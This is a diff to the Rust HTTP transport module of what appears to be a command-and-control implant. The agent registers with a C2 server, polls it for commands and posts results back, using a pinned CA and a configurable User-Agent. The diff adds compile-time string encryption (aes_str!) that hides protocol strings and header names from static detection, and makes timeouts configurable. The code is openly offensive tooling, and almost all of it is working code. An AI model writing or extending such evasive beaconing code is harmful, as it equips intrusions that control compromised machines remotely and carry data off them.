@@ -17,6 +17,8 @@
 // large file-transfer operations do not trigger premature reconnects
 // when the blocking I/O pool is under heavy load.
 
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 use reqwest::{Client, Proxy};
 use serde::Deserialize;
 
@@ -31,11 +33,17 @@ pub fn build_client(config: &C2Config) -> Result<Client, String> {
     let ca_cert = reqwest::Certificate::from_pem(ca_pem)
         .map_err(|e| format!("Failed to parse embedded CA cert: {}", e))?;
 
+    // Timeouts from the typed agent config (defaults: 120 s request,
+    // 15 s connect). The 120 s request timeout keeps large file-transfer
+    // operations from triggering premature reconnects when the blocking
+    // I/O pool is under heavy load.
+    // (Fully-qualified: the `config: &C2Config` parameter shadows the accessor.)
+    let agent_cfg = &crate::config::config().agent;
     let mut builder = Client::builder()
         .add_root_certificate(ca_cert)
         .tls_built_in_root_certs(false) // Only trust our pinned CA, not the system store
-        .timeout(std::time::Duration::from_secs(120))
-        .connect_timeout(std::time::Duration::from_secs(15));
+        .timeout(std::time::Duration::from_secs(agent_cfg.request_timeout_secs))
+        .connect_timeout(std::time::Duration::from_secs(agent_cfg.connect_timeout_secs));
 
     // User-Agent from malleable profile
     if !config.profile.user_agent.is_empty() {
@@ -63,9 +71,9 @@ pub fn build_client(config: &C2Config) -> Result<Client, String> {
 /// The base URL for the C2 server.
 pub fn base_url(config: &C2Config) -> String {
     let scheme = if config.transport == crate::common::TransportProtocol::Https {
-        "https"
+        aes_str!("https")
     } else {
-        "http"
+        aes_str!("http")
     };
     format!("{}://{}:{}", scheme, config.c2_host, config.tunnel_port)
 }
@@ -98,7 +106,7 @@ pub async fn register(client: &Client, base: &str, hello: &ClientHello) -> Resul
 pub async fn poll(client: &Client, base: &str, token: &str, profile_uri: &str) -> Result<Vec<SecuredCommand>, String> {
     let url = format!("{}{}", base, profile_uri);
     let resp = client.get(&url)
-        .header("X-Session-Token", token)
+        .header(aes_str!("X-Session-Token"), token)
         .send()
         .await
         .map_err(|e| format!("Poll: {}", e))?;
@@ -108,7 +116,7 @@ pub async fn poll(client: &Client, base: &str, token: &str, profile_uri: &str) -
     }
 
     let body = resp.text().await.map_err(|e| format!("Body: {}", e))?;
-    if body.trim().is_empty() || body.contains("\"data\":[]") {
+    if body.trim().is_empty() || body.contains(&aes_str!("\"data\":[]")) {
         return Ok(Vec::new());
     }
 
@@ -120,7 +128,7 @@ pub async fn poll(client: &Client, base: &str, token: &str, profile_uri: &str) -
 pub async fn send_result(client: &Client, base: &str, token: &str, resp: &CommandResponse, profile_uri: &str) -> Result<(), String> {
     let url = format!("{}{}", base, profile_uri);
     client.post(&url)
-        .header("X-Session-Token", token)
+        .header(aes_str!("X-Session-Token"), token)
         .json(resp)
         .send()
         .await
